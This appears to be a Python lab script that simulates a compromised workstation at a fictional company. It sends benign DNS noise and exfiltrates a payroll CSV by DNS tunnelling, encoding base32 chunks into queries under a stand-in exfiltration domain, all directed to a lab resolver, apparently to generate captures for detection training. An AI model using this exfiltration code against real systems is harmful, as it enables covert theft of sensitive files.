#!/usr/bin/env python3
"""
Estación de trabajo comprometida de Northwind Global Systems.

Genera actividad benigna de fondo y, entremezclado, el malware exfiltrando un
fichero sensible por DNS tunneling:

  init.<b32(nombre)>.<dominio>       -> anuncia el fichero
  d0001.<trozo_base32>.<dominio>     -> cada fragmento de datos
  fin.<n>.<dominio>                  -> marca de fin

Todo el tráfico se dirige al 'resolver' del laboratorio, así una única captura
lo contiene todo.
"""
import base64
import os
import random
import socket
import time

from dnslib import DNSRecord

EXFIL_DOMAIN = os.environ.get("EXFIL_DOMAIN", "sync-telemetry-cdn.net").rstrip(".")
RESOLVER_HOST = os.environ.get("RESOLVER_HOST", "resolver")
SECRET_FILE = os.environ.get("SECRET_FILE", "/seed/northwind_payroll_Q3.csv")
CHUNK = int(os.environ.get("CHUNK_LEN", "48"))

BENIGN = [
    "www.microsoft.com", "outlook.office365.com", "www.google.com",
    "clients4.google.com", "update.googleapis.com", "cdn.jsdelivr.net",
    "mail.northwind-systems.com", "intranet.northwind-systems.com",
    "ntp.ubuntu.com", "api.github.com", "slack.com", "teams.microsoft.com",
]


def log(m):
    print(m, flush=True)


def resolve_ip(host, retries=30):
    for _ in range(retries):
        try:
            return socket.gethostbyname(host)
        except socket.gaierror:
            time.sleep(1)
    raise SystemExit(f"[victim] no pude resolver '{host}'")


def send(qname, ip):
    try:
        DNSRecord.question(qname, "A").send(ip, 53, timeout=3)
    except Exception as e:
        log(f"[victim] fallo {qname}: {e}")


def b32(data):
    return base64.b32encode(data).decode("ascii").rstrip("=").lower()


def noise(ip, n):
    for _ in range(n):
        send(random.choice(BENIGN), ip)
        time.sleep(random.uniform(0.05, 0.25))


def main():
    time.sleep(int(os.environ.get("START_DELAY", "6")))
    ip = resolve_ip(RESOLVER_HOST)
    log(f"[victim] resolver={RESOLVER_HOST} ({ip}) exfil={EXFIL_DOMAIN}")

    log("[victim] tráfico benigno de fondo...")
    noise(ip, 20)

    with open(SECRET_FILE, "rb") as fh:
        raw = fh.read()
    payload = b32(raw)
    fname = os.path.basename(SECRET_FILE)
    log(f"[victim] exfiltrando '{fname}' ({len(raw)} bytes -> {len(payload)} b32)")

    send(f"init.{b32(fname.encode())}.{EXFIL_DOMAIN}", ip)
    seq = 0
    for i in range(0, len(payload), CHUNK):
        send(f"d{seq:04d}.{payload[i:i+CHUNK]}.{EXFIL_DOMAIN}", ip)
        seq += 1
        if random.random() < 0.15:
            send(random.choice(BENIGN), ip)
        time.sleep(random.uniform(0.03, 0.12))
    send(f"fin.{seq}.{EXFIL_DOMAIN}", ip)

    noise(ip, 15)
    log(f"[victim] exfiltración completada en {seq} consultas. Fin.")


if __name__ == "__main__":
    main()
